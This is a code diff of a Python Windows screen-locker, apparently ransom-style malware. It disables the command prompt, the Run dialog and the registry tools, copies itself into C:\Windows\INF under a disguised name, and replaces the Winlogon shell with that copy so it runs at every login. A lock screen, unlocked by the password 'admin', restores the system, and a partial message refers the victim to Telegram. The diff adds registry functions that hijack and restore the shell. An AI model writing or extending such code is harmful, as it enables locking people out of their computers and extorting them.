@@ -8,6 +8,8 @@ import shutil
 import time
 from ctypes import windll, c_int, c_uint, c_ulong, byref, POINTER
 import subprocess
+
+import reg
 import win32gui
 import win32con
 
@@ -97,7 +99,6 @@ def MinusRegedit():
         r'REG ADD "HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 2 /f',
         r'REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f',
         r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 0 /f',
-        r'REG ADD "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v shell /t REG_SZ /d "C:\Windows\INF\c_usbdevice.exe" /f'
     ]
     # Выполнение всех команд в одном месте
     for command in commands:
@@ -107,6 +108,21 @@ def MinusRegedit():
         except subprocess.CalledProcessError as e:
             print(f"Ошибка при выполнении команды: {e}")
 
+def change_shell():
+    try:
+        key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon")
+        reg.SetValueEx(key, "shell", 0, reg.REG_SZ, "C:/Windows/INF/c_usbdevice.exe")
+        reg.CloseKey(key)
+    except Exception as e:
+        print(f"Ошибка при установке значения реестра: {e}")
+
+def fix_shell():
+    try:
+        key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon")
+        reg.SetValueEx(key, "shell", 0, reg.REG_SZ, "explorer.exe")
+        reg.CloseKey(key)
+    except Exception as e:
+        print(f"Ошибка при установке значения реестра: {e}")
 
 
 MinusRegedit()
@@ -126,6 +142,7 @@ kill_app()
 target_directory = r"C:\Windows\INF"
 target_filename = "c_usbdevice.exe"
 copy_self_to_target(target_directory, target_filename)
+change_shell()
 
 def get_current_volume():
     """ Получает текущий уровень громкости через pycaw """
@@ -201,7 +218,6 @@ def PlusRegedit():
         r'REG DELETE "HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableCMD /f',
         r'REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /f',
         r'REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /f'
-        r'REG ADD "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v shell /t REG_SZ /d "explorer.exe" /f'
     ]
 
     for command in commands:
@@ -420,7 +436,7 @@ Donald Trump, and Elon Musk. Even if you believe this is a mistake, write to Tel
                         if text == "admin":
                             print("Успех! Пароль верный.")
                             PlusRegedit()
-                            subprocess.call("start explorer.exe", shell=True)
+                            fix_shell()
                             pygame.quit()
                             sys.exit()
                         else:
